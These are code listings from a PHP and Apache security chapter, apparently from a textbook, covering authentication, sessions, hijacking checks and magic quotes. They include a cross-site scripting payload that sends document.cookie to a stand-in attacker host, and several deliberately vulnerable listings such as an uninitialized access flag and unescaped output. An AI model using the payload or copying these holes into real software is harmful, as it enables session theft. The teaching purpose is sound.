chapter: Security
==================
Example: Using Apache authentication to restrict access to scripts
AuthType Basic
AuthName "Administrators Only"
AuthUserFile /usr/local/apache/passwd/passwords
Require valid-user

    
    
====================================

chmod 644 /usr/local/apache/passwd/passwords

    
    
====================================
Example: Creating an Apache password for .htaccess
htpasswd -c /usr/local/apache/passwd/passwords mdavis

    
    
====================================

Adding password for user mdavis

    
    
====================================
Example: Comparing the output of md5 to that of sha1
<?php
echo "Encrypting <b>testing</b> using md5: ".md5("testing");
echo "<br />";
echo "Encrypting <b>testing</b> using sha1: ".sha1("testing");
?>

    
    
====================================
Example: Not initializing a variable was a hole in sample.php
<?php
//The check_username_and_password(  ) function returns TRUE or FALSE and does
//not modify the $access variable.
if (check_username_and_password(  )) {
    //they logged in successfully
    $access = TRUE;
}
if ($access) {
    echo "Welcome to the administrative control panel.";
    //more privileged code here...
}
else {
    echo "Access denied";
}
?>

    
    
====================================

<?php
//predefining the value is good coding practice anyway
$access = FALSE;
if (check_username_and_password(  )) {
    //they logged in successfully
    $access = TRUE;
}
if ($access) {
    echo "Welcome to the administrative control panel.";
    //more privileged code here...

}
else {
    echo "Access denied";
}
?>

    
    
====================================
Example: Sessions with register_globals on or off in session_test.php
<?php
session_start(  );
if (isset($username)) {
    $username=htmlentities($username);
    echo "Hello $username";
}
else {
    echo "Please login.";
}
?>

    
    
====================================
Example: Session using the proper $_SESSION super global
<?php
session_start(  );
if (isset($_SESSION['username'])) {
    $username=htmlentities($_SESSION['username']);  //No cross site scripting
    echo "Hello $username";
} else {
    echo "Please login.";
}
?>

    
    
====================================
Example: Detecting simple variable poisoning
<?php
if (isset($_COOKIE['MAGIC_COOKIE'])) {
    // MAGIC_COOKIE comes from a cookie.
    // Be sure to validate the cookie data!
}
elseif (isset($_GET['MAGIC_COOKIE']) || isset($_POST['MAGIC_COOKIE'])) {
    mail("admin@example.com", "Possible breakin attempt", $_SERVER['REMOTE_ADDR']);
    echo "Security violation, admin has been alerted.";
    exit;
}
else {
   // MAGIC_COOKIE isn't set through this REQUEST
}
?>

    
    
====================================
Example: Checking for session hijacking
<?php
session_start(  );
$user_check = md5($_SERVER['HTTP_USER_AGENT'] . $_SERVER['REMOTE_ADDR']);
if (empty($_SESSION['user_data'])) {
    session_regenerate_id(  );
    echo ("New session, saving user_check.");
    $_SESSION['user_data'] = $user_check;
}
if (strcmp($_SESSION['user_data'], $user_check) !== 0) {
    session_regenerate_id(  );
    echo ("Warning, you must reenter your session.");
    $_SESSION = array(  );
    $_SESSION['user_data'] = $user_check;
}

else {
    echo ("Connection verified!");
}
?>

    
    
====================================
Example: session.save_path functionality
<?php
    ini_set('session.save_path', '/home/user/sessions/');
    session_start(  );
?>

    
    
====================================
Example: Suppressing the standard database error message
<?php
require_once('db_login.php');
$error = "Site down for maintenance, please check back.";
$db_link = @mysql_connect($db_host, $db_username, $db_password) or die($error);
@mysql_select_db($db_database, $db_link) or die($error);
?>

    
    
====================================

<script>
document.location = 'http:/scam.ng/yoink.php?your_private_cookies=' + document.cookie
</script>

    
    
====================================

<?php
  echo $article;
?>

    
    
====================================
Example: Seeing the results of magic quotes
<?php
if (is_null($_GET["search"])) {
    $self=htmlentities($_SERVER['PHP_SELF']);
    echo ("<form action=\"$self\" ");
    echo ('method="get">
           <label> Search: <input type="text" name="search" id="search"> </label>
               <input type="submit" value="Go!">
           </form>
          ');
}
else {
    $search= $_GET[search];
    echo "The search string is: <strong>$search</strong>.";
}
?>

    
    
====================================
Example: Checking for magic quotes
<?php
if (is_null($_GET["search"])) {
    echo '<form method="'.htmlentities($_SERVER["PHP_SELF"]).'" method="GET">';
    echo '    <label>';
    echo '       Search:';
    echo '       <input type="text" name="search" id="search" />';
    echo '    </label>';
    echo '    <input type="submit" value="Go!" />';
    echo '</form>';
    } else {
    $search = $_GET["search"];

    if (!get_magic_quotes_gpc(  )) {
        $search = htmlentities($search);
    }
    if ($search != NULL ){
        echo "The search string is: <strong>$search</strong>.";
    }
}
?>

    
    
==================